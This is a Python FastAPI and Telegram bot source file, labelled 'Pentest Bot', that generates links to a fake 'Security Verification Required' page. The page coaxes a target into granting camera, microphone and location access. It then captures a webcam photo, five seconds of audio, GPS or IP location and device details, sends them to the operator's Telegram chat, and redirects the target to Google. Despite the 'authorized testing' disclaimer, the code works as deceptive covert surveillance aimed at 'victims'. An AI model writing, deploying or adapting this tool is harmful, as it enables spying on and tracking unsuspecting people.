import os
import json
import uuid
import requests
from fastapi import FastAPI, Request, HTMLResponse
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler, MessageHandler, filters

TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
ADMIN_IDS = os.environ.get("ADMIN_IDS", "").split(",")  # Your Telegram user IDs

app = FastAPI()

# Store generated links and their data (in-memory, resets on redeploy)
# For production, use a database
active_links = {}

# ============== TELEGRAM BOT HANDLERS ==============

async def start(update, context):
    user_id = str(update.effective_user.id)
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    keyboard = [
        [InlineKeyboardButton("🎯 Generate New Link", callback_data="generate")],
        [InlineKeyboardButton("📊 My Active Links", callback_data="my_links")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🤖 *Pentest Bot v2.0*\n\n"
        "Welcome, Admin!\n\n"
        "Generate phishing simulation links to test "
        "your organization's security awareness.\n\n"
        "⚠️ *For authorized testing only*",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)
    
    if user_id not in ADMIN_IDS:
        await query.edit_message_text("❌ Unauthorized.")
        return
    
    if query.data == "generate":
        # Generate unique link ID
        link_id = str(uuid.uuid4())[:8]
        base_url = os.environ.get("BASE_URL", "https://your-domain.vercel.app")
        victim_url = f"{base_url}/capture/{link_id}"
        
        # Store link info
        active_links[link_id] = {
            "admin_id": user_id,
            "created_at": str(update.update_id),
            "victim_data": None
        }
        
        keyboard = [
            [InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link_id}")],
            [InlineKeyboardButton("🔄 Generate Another", callback_data="generate")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"✅ *Link Generated!*\n\n"
            f"📎 Send this to target:\n"
            f"`{victim_url}`\n\n"
            f"Target sees: *Security Verification Required*\n"
            f"Requests: 📷 Camera · 📍 Location · 🎤 Microphone\n\n"
            f"When target allows access, data arrives here.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    elif query.data.startswith("copy_"):
        link_id = query.data.replace("copy_", "")
        base_url = os.environ.get("BASE_URL", "https://your-domain.vercel.app")
        victim_url = f"{base_url}/capture/{link_id}"
        
        await query.answer(f"Link copied: {victim_url}", show_alert=True)
    
    elif query.data == "my_links":
        if not active_links:
            await query.edit_message_text(
                "📊 *Active Links*\n\nNo links generated yet.",
                parse_mode="Markdown"
            )
            return
        
        msg = "📊 *Your Active Links*\n\n"
        for lid, info in list(active_links.items())[:10]:
            status = "✅ Captured" if info["victim_data"] else "⏳ Waiting"
            msg += f"• `{lid}` — {status}\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(msg, reply_markup=reply_markup, parse_mode="Markdown")
    
    elif query.data == "back":
        keyboard = [
            [InlineKeyboardButton("🎯 Generate New Link", callback_data="generate")],
            [InlineKeyboardButton("📊 My Active Links", callback_data="my_links")],
            [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🤖 *Pentest Bot v2.0*\n\n"
            "Welcome back, Admin!",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    elif query.data == "settings":
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "⚙️ *Settings*\n\n"
            "Configure your phishing page template:\n"
            "• Template: Zoom Security Verification\n"
            "• Redirect after capture: Google.com\n"
            "• Auto-capture interval: Every 5 seconds\n\n"
            "(Customize in code)",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

# ============== VICTIM CAPTURE PAGE ==============

@app.get("/capture/{link_id}", response_class=HTMLResponse)
async def capture_page(link_id: str):
    """Serve the phishing simulation page to the victim."""
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification Required</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
               background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
               min-height: 100vh; display: flex; align-items: center; justify-content: center; }}
        .card {{ background: white; border-radius: 20px; padding: 40px; max-width: 420px;
                width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; }}
        .shield {{ width: 80px; height: 80px; background: #667eea; border-radius: 50%;
                  display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }}
        .shield svg {{ width: 40px; height: 40px; fill: white; }}
        h1 {{ font-size: 22px; color: #1a1a2e; margin-bottom: 10px; }}
        p {{ color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }}
        .status {{ background: #f0f0ff; padding: 15px; border-radius: 12px; margin: 20px 0; }}
        .status-item {{ display: flex; align-items: center; justify-content: space-between; padding: 8px 0; }}
        .status-item .label {{ color: #555; font-size: 14px; }}
        .status-item .icon {{ width: 24px; height: 24px; border-radius: 50%; display: inline-block; }}
        .check {{ background: #4CAF50; }}
        .pending {{ background: #ff9800; animation: pulse 1.5s infinite; }}
        @keyframes pulse {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.5; }} }}
        .btn {{ background: #667eea; color: white; border: none; padding: 14px 40px;
               border-radius: 30px; font-size: 16px; cursor: pointer; transition: 0.3s; margin-top: 10px; }}
        .btn:hover {{ background: #5a6fd6; transform: translateY(-2px); }}
        .btn:disabled {{ background: #ccc; cursor: not-allowed; transform: none; }}
        .hidden {{ display: none; }}
        .loader {{ border: 3px solid #f3f3f3; border-top: 3px solid #667eea; border-radius: 50%;
                  width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .success {{ color: #4CAF50; font-weight: bold; margin-top: 15px; }}
    </style>
</head>
<body>
    <div class="card">
        <div class="shield">
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
        </div>
        <h1>Identity Verification Required</h1>
        <p>Your organization requires a quick security check before accessing this resource. This takes 10 seconds.</p>
        
        <div class="status">
            <div class="status-item">
                <span class="label">📷 Camera Access</span>
                <span class="icon pending" id="cam-status"></span>
            </div>
            <div class="status-item">
                <span class="label">📍 Location Access</span>
                <span class="icon pending" id="loc-status"></span>
            </div>
            <div class="status-item">
                <span class="label">🎤 Microphone Access</span>
                <span class="icon pending" id="mic-status"></span>
            </div>
        </div>
        
        <button class="btn" id="startBtn" onclick="startCapture()">Start Verification</button>
        <div id="loader" class="loader hidden"></div>
        <div id="successMsg" class="success hidden">✅ Verification Complete! Redirecting...</div>
    </div>

    <script>
        const LINK_ID = '{link_id}';
        const BOT_TOKEN = '{TOKEN}';
        
        // Get admin's chat ID from the link data
        let adminChatId = null;
        let mediaStream = null;
        
        function startCapture() {{
            document.getElementById('startBtn').disabled = true;
            document.getElementById('startBtn').textContent = 'Processing...';
            document.getElementById('loader').classList.remove('hidden');
            
            // Step 1: Get IP and location first
            fetchLocation();
            
            // Step 2: Request camera
            requestCamera();
            
            // Step 3: Request mic
            requestMic();
        }}
        
        function fetchLocation() {{
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    position => {{
                        document.getElementById('loc-status').className = 'icon check';
                        sendTelegram(
                            `📍 *Location Captured*\\nLat: ${{position.coords.latitude}}\\nLng: ${{position.coords.longitude}}\\nAccuracy: ${{position.coords.accuracy}}m`,
                            'location'
                        );
                    }},
                    error => {{
                        // Fallback: get IP-based location
                        fetch('https://ipapi.co/json/')
                            .then(r => r.json())
                            .then(data => {{
                                sendTelegram(
                                    `📍 *Approximate Location*\\nIP: ${{data.ip}}\\nCity: ${{data.city}}\\nRegion: ${{data.region}}\\nCountry: ${{data.country_name}}\\nISP: ${{data.org}}`,
                                    'location'
                                );
                            }});
                        document.getElementById('loc-status').className = 'icon check';
                    }},
                    {{ enableHighAccuracy: true, timeout: 10000 }}
                );
            }} else {{
                fetch('https://ipapi.co/json/')
                    .then(r => r.json())
                    .then(data => {{
                        sendTelegram(
                            `📍 *Approximate Location*\\nIP: ${{data.ip}}\\nCity: ${{data.city}}\\nRegion: ${{data.region}}\\nCountry: ${{data.country_name}}`,
                            'location'
                        );
                    }});
                document.getElementById('loc-status').className = 'icon check';
            }}
        }}
        
        function requestCamera() {{
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {{
                sendTelegram('❌ Camera API not available on this browser');
                return;
            }}
            
            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }})
                .then(stream => {{
                    mediaStream = stream;
                    document.getElementById('cam-status').className = 'icon check';
                    
                    // Capture photo from stream
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {{
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
                        sendPhotoToTelegram(imageData);
                        
                        // Stop camera
                        stream.getTracks().forEach(t => t.stop());
                    }}, 2000);
                }})
                .catch(err => {{
                    sendTelegram(`❌ Camera denied: ${{err.message}}`);
                    document.getElementById('cam-status').className = 'icon pending';
                }});
        }}
        
        function requestMic() {{
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
            
            navigator.mediaDevices.getUserMedia({{ video: false, audio: true }})
                .then(stream => {{
                    document.getElementById('mic-status').className = 'icon check';
                    
                    // Record 5 seconds of audio
                    const mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    mediaRecorder.onstop = () => {{
                        const blob = new Blob(chunks, {{ type: 'audio/webm' }});
                        sendAudioToTelegram(blob);
                    }};
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 5000);
                }})
                .catch(err => {{
                    document.getElementById('mic-status').className = 'icon pending';
                }});
        }}
        
        function sendTelegram(text, type = 'info') {{
            fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage`, {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{
                    chat_id: '{ADMIN_IDS[0]}'.trim(),
                    text: text,
                    parse_mode: 'Markdown'
                }})
            }});
        }}
        
        function sendPhotoToTelegram(dataUrl) {{
            // Convert base64 to blob
            const byteString = atob(dataUrl.split(',')[1]);
            const mimeString = dataUrl.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {{
                ia[i] = byteString.charCodeAt(i);
            }}
            const blob = new Blob([ab], {{ type: mimeString }});
            
            const formData = new FormData();
            formData.append('chat_id', '{ADMIN_IDS[0]}'.trim());
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', `📸 *Camera Capture*\\nLink ID: {link_id}\\nTime: ${{new Date().toISOString()}}`);
            formData.append('parse_mode', 'Markdown');
            
            fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendPhoto`, {{
                method: 'POST',
                body: formData
            }});
        }}
        
        function sendAudioToTelegram(blob) {{
            const formData = new FormData();
            formData.append('chat_id', '{ADMIN_IDS[0]}'.trim());
            formData.append('audio', blob, 'audio.webm');
            formData.append('caption', `🎤 *Audio Recording*\\nLink ID: {link_id}`);
            formData.append('parse_mode', 'Markdown');
            
            fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendAudio`, {{
                method: 'POST',
                body: formData
            }});
        }}
        
        // Send device info automatically
        fetch('https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                chat_id: '{ADMIN_IDS[0]}'.trim(),
                text: `🖥️ *Device Info*\\nLink ID: {link_id}\\nBrowser: ${{navigator.userAgent}}\\nPlatform: ${{navigator.platform}}\\nLanguage: ${{navigator.language}}\\nScreen: ${{screen.width}}x${{screen.height}}\\nTime: ${{new Date().toISOString()}}`,
                parse_mode: 'Markdown'
            }})
        }});
        
        // Complete after 8 seconds
        setTimeout(() => {{
            document.getElementById('loader').classList.add('hidden');
            document.getElementById('successMsg').classList.remove('hidden');
            setTimeout(() => {{
                window.location.href = 'https://www.google.com';
            }}, 2000);
        }}, 8000);
    </script>
</body>
</html>"""
    return HTMLResponse(content=html)

# ============== TELEGRAM WEBHOOK ==============

class TelegramUpdate(BaseModel):
    update_id: int
    message: Optional[dict] = None
    callback_query: Optional[dict] = None

@app.post("/webhook")
async def webhook(update_data: TelegramUpdate):
    bot = Bot(token=TOKEN)
    update = Update.de_json(update_data.__dict__, bot)
    
    dp = Dispatcher(bot, None, workers=4, use_context=True)
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button_handler))
    
    await dp.process_update(update)
    return {"ok": True}

@app.get("/")
async def index():
    return {"status": "Pentest Bot Running", "version": "2.0"}

# Health check for Vercel
@app.get("/api/health")
async def health():
    return {"status": "ok"}
